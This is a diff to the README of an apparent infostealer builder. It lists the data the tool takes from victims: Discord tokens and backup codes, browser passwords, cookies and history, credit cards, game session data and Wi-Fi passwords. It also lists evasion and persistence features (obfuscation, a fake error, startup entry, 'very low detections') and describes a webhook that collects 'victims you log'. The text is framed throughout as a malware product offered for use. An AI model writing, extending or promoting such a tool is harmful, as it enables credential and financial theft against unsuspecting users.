@@ -20,37 +20,36 @@
   
 ### Features:
 
-- `Token`🟢
-- `Discord Name`🟢
-- `Google Passwords`🟢
-- `Google Cookies`🟢
+- `Discord Token`🟢
+- `Browser Passwords`🟢
+- `Browser Cookies`🟢
+- `Browser History`🟢
+- `Roblox Cookies`🟢
+- `Credit Cards`🟢
 - `IP`🟢
 - `Phone Number`🟢
 - `Email`🟢
-- `If They Have Billing`🟢
+- `Discord Injection`🟢
+- `Wifi Passwords`🟢
+- `Minecraft Session Info`🟢
+- `2FA Enabled Or Not`🟢
+- `Gift Inventory Codes`🟢
+- `Discord Backup Codes`🟢
 - `If They Have Nitro`🟢
 - `What OS They're Using`🟢
 - `RAM`🟢
 - `GPU`🟢
 - `CPU`🟢
-- `Injection`🟢
-- `Browser History`🟢
-- `Wifi Passwords`🟢
-- `Minecraft Session Info`🟢
-- `Epic Games Offline Data`🟢
-- `2FA Enabled Or Not`🟢
-- `Gift Inventory Codes`🟢
-- `Discord Backup Codes`🟢
-- `Credit Cards`🟢
 - `Fake Error`🟢
 - `Obfuscation`🟢
-- `Condense .Exe Size`🟢
+- `Condensed .Exe Size`🟢
 - `Icon For .Exe (optional)`🟢
 - `Add File To Startup`🟢
 - `Anti Spam (just prevents from multiple instances running at once)`🟢
+- `Very Low Detections`🟢
 - `Bypass Token Protector`🟡
-- `Binder`🟡
 - `WebCam Screenshot (optional)`🟡
+- `Binder`🟡
 
 🟢 = Added | 🟡 = To Do | 🔴 = Not Adding
 
@@ -84,7 +83,7 @@ This webhook will be sent any victims you log so don't delete it once it's made.
 into the terminal when prompted.
 ```
 
-### 4. Conifgurable Options:
+### 4. Configurable Options:
 
 ```
 Now once you've given your file a name you can pick between some options by typing either y or n for each one. After
@@ -94,7 +93,7 @@ having done that the file will be built and ready for usage.
 ### 5. Test The File:
 
 ```
-You will then be promtped as to whether you want to run the file or not. I reccomend this so you
+You will then be promtped as to whether you want to run the file or not. I recommend this so you
 can see if there are any issues or not.
 ```
 
